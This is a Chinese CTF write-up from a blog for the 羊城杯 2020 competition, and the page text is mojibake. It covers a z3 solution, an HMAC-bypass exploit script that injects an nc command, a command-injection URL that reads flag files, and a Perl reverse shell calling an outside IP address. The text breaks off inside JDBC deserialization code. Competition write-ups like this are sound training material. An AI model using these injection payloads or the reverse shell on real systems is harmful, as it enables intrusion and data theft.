<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>ccreaterã®blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="ccreaterã®blog">
<meta property="og:url" content="https://site.ccreater.top/page/3/index.html">
<meta property="og:site_name" content="ccreaterã®blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="ccreaterã®blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">ccreaterã®blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ç¾ŠåŸæ¯2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/09/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/" class="article-date">
  <time class="dt-published" datetime="2020-09-13T16:00:00.000Z" itemprop="datePublished">2020-09-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/09/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/">ç¾ŠåŸæ¯2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ç¾ŠåŸæ¯-2020"><a href="#ç¾ŠåŸæ¯-2020" class="headerlink" title="ç¾ŠåŸæ¯ 2020"></a>ç¾ŠåŸæ¯ 2020</h1><h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p>è¿™æ¬¡æ‹¿äº†ç¬¬ä¸‰ï¼Œå¸®è‹å“¥æ‰¬åå¾ˆå¼€å¿ƒï¼ˆé˜Ÿåï¼šç”œç”œçš„æ‹çˆ±ä¸è‹å“¥æœ‰å…³ï¼‰:joy:</p>
<p>å¯¹äºæˆ‘è¿™ä¸ªğŸ¥¬:baby_chick: æ¥è¯´è¿˜æ˜¯æŒºå¥½çš„</p>
<h2 id="com"><a href="#com" class="headerlink" title="com"></a>com</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983</span><br><span class="line">822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626</span><br><span class="line">717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 7647213</span><br><span class="line">20 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689</span><br><span class="line">642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071</span><br><span class="line">488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209</span><br><span class="line">464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063</span><br><span class="line">388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784</span><br><span class="line">332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602</span><br><span class="line">676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990</span><br><span class="line">938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 8898943</span><br><span class="line">78 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461</span><br><span class="line">938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244</span><br><span class="line">894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064</span><br><span class="line">319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041</span><br><span class="line">913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322</span><br><span class="line">351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073</span><br><span class="line">786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 8681868</span><br><span class="line">8 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965</span><br><span class="line">434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233</span><br><span class="line">366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602</span><br><span class="line">515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162</span><br><span class="line">883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730</span><br><span class="line">498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522</span><br><span class="line">552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629</span><br><span class="line">596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453</span><br><span class="line">717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378</span><br><span class="line">118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748</span><br><span class="line">238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183</span><br><span class="line">223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555</span><br><span class="line">838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252</span><br><span class="line">805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217</span><br><span class="line">598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611</span><br><span class="line">784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 8364295</span><br><span class="line">1003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387</span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿæ ¼å¼å‘ç°æ˜¯ä¸€ä¸ª36*35çš„çŸ©é˜µï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯ä¸€ä¸ª35å…ƒä¸€æ¬¡çº¿æ€§æ–¹ç¨‹ç»„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;&quot;360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983</span><br><span class="line">822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626</span><br><span class="line">717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 7647213</span><br><span class="line">20 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689</span><br><span class="line">642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071</span><br><span class="line">488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209</span><br><span class="line">464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063</span><br><span class="line">388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784</span><br><span class="line">332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602</span><br><span class="line">676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990</span><br><span class="line">938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 8898943</span><br><span class="line">78 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461</span><br><span class="line">938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244</span><br><span class="line">894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064</span><br><span class="line">319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041</span><br><span class="line">913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322</span><br><span class="line">351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073</span><br><span class="line">786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 8681868</span><br><span class="line">8 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965</span><br><span class="line">434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233</span><br><span class="line">366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602</span><br><span class="line">515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162</span><br><span class="line">883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730</span><br><span class="line">498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522</span><br><span class="line">552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629</span><br><span class="line">596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453</span><br><span class="line">717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378</span><br><span class="line">118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748</span><br><span class="line">238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183</span><br><span class="line">223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555</span><br><span class="line">838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252</span><br><span class="line">805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217</span><br><span class="line">598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611</span><br><span class="line">784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 8364295</span><br><span class="line">1003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387&quot;&quot;&quot;</span><br><span class="line">a=a.splitlines()</span><br><span class="line">s=[]</span><br><span class="line">result=[0]*35</span><br><span class="line">for i in a:</span><br><span class="line">    s.append(i.split(&quot; &quot;))</span><br><span class="line"></span><br><span class="line">solve = Solver()</span><br><span class="line">X =  [Int(&#x27;x%s&#x27; % i) for i in range(35) ]</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    for j in range(len(s[i][:-1])):</span><br><span class="line">        result[i]+=int(s[i][j])*X[j]</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    solve.add(result[i]==int(s[i][-1]))</span><br><span class="line">print solve.check()</span><br><span class="line">m = solve.model()</span><br><span class="line">print &quot;traversing model...&quot;</span><br><span class="line">pri=[]</span><br><span class="line">for i in range(35):</span><br><span class="line">    pri.append(int(&quot;%s&quot; % (m[X[i]])))</span><br><span class="line">print pri</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>GWHT{4b55c1d5fb6a0234fc252b19e510301a}</p>
<h2 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h2><p>ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p>
<h2 id="blackhat"><a href="#blackhat" class="headerlink" title="blackhat"></a>blackhat</h2><p>æŸ¥çœ‹Hei_Mao_Jing_Chang.mp3å‘ç°æºæ–‡ä»¶ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if(empty($_POST[&#x27;Black-Cat-Sheriff&#x27;]) || empty($_POST[&#x27;One-ear&#x27;]))&#123;</span><br><span class="line">    die(&#x27;Ë­ï¿½ï¿½ï¿½ï¿½ï¿½Ò²ï¿½ï¿½ï¿½Ò»Ö»ï¿½ï¿½ï¿½ï¿½Î²ï¿½Í£ï¿½&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(&quot;clandestine&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;White-cat-monitor&#x27;]))</span><br><span class="line">    $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);</span><br><span class="line"></span><br><span class="line">if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123;</span><br><span class="line">    die(&#x27;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½×¼ï¿½ï¿½Ä¿ï¿½ê¡£ï¿½ï¿½ï¿½ï¿½ï¿½Ô¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç¿ï¿½ï¿½ï¿½ï¿½Ğ°ï¿½ï¿½Äµï¿½ï¿½Óµï¿½ï¿½ï¿½&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo exec(&quot;nc&quot;.$_POST[&#x27;One-ear&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»¤<code>$_POST[&#39;White-cat-monitor&#39;]</code>ä¸ºç©ºä»è€Œæ§åˆ¶<code>$clandestine</code></p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">b&quot; ccreater.top:60006||cat /var/www/html/flag.php&quot;</span></span><br><span class="line">h = hmac.<span class="keyword">new</span>(<span class="string">b&quot;&quot;</span>, cmd, digestmod=<span class="string">&#x27;sha256&#x27;</span>).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://183.129.189.60:10022/&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;White-cat-monitor[]&quot;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&quot;One-ear&quot;</span>: cmd, <span class="string">&quot;Black-Cat-Sheriff&quot;</span>: h&#125;</span><br><span class="line">r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag</p>
<h2 id="easyphp2"><a href="#easyphp2" class="headerlink" title="easyphp2"></a>easyphp2</h2><p>æ‰«ç›®å½•å‘ç°robots.txtå¾—åˆ°æç¤ºï¼š</p>
<p><code>/?file=check.php</code></p>
<p>åˆ©ç”¨fileå¤„çš„ä»»æ„æ–‡ä»¶è¯»å–è·å¾— check.phpå†…å®¹ï¼ˆç”¨zlibå‹ç¼©ç»•è¿‡base64è¢«banï¼‰ï¼Œè·å¾—å¯†ç ï¼šGWHT,ä¸€æ¬¡è¯»å–GWHT.phpå¾—çŸ¥countå‚æ•°å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œ,å…¨å±€æŸ¥æ‰¾å‘ç°</p>
<p>/GWHT/system/of/a/down/flag.txt</p>
<p><code>http://183.129.189.60:10025/GWHT.php?count=123&#39;%26%26cat+/GWHT/system/of/a/down/flag.txt%26%26sss%26%26&#39;</code></p>
<p>/GWHT/ç›®å½•ä¸‹çš„readmeå­˜ç€GWHTçš„å¯†ç ï¼Œå»cmd5èŠ±ä¸€å—é’±è§£å¯†å¾—åˆ°å¯†ç </p>
<p>My password hash is 877862561ba0162ce610dd8bf90868ad414f0ec6. :<code>GWHTCTF</code> </p>
<p>/GWHTä¸‹findaasçš„å†…å®¹ï¼ˆåŸæœ¬ä»¥ä¸ºè¿™ä¸ªæ–‡ä»¶æœ‰Sæƒé™ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Enter a filename and find it here!&quot;</span></span><br><span class="line"></span><br><span class="line">find . -name <span class="variable">$1</span></span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨åå¼¹shellæ¥ç™»é™†GWHT</p>
<p>åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;perl -e \&#x27;use Socket;$i=&quot;39.108.164.219&quot;;$p=60007;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
<p><code>GWHT&#123;Y0U_H4VE_A_BETTER_SK1LL&#125;</code></p>
<h2 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a><br>JDBCååºåˆ—åŒ–ï¼š<br>InfoInvocationHandler::invoke-&gt;Databaseinfo::checkAllInfo-&gt;DriverManager.getConnection</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(<span class="meta">@CookieValue(value = &quot;data&quot;, required = false)</span>String cookieData, Model model)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cookieData == <span class="keyword">null</span> || cookieData.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/index&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Info info = (Info)deserialize(cookieData);</span><br><span class="line">        <span class="keyword">if</span> (info != <span class="keyword">null</span>) &#123;</span><br><span class="line">            model.addAttribute(<span class="string">&quot;info&quot;</span>, info.getAllInfo());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>DatabaseInfo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseInfo</span> <span class="keyword">implements</span> <span class="title">Serializable</span>, <span class="title">Info</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://&quot;</span> + <span class="keyword">this</span>.host + <span class="string">&quot;:&quot;</span> + <span class="keyword">this</span>.port + <span class="string">&quot;/jdbc?user=&quot;</span> + <span class="keyword">this</span>.username + <span 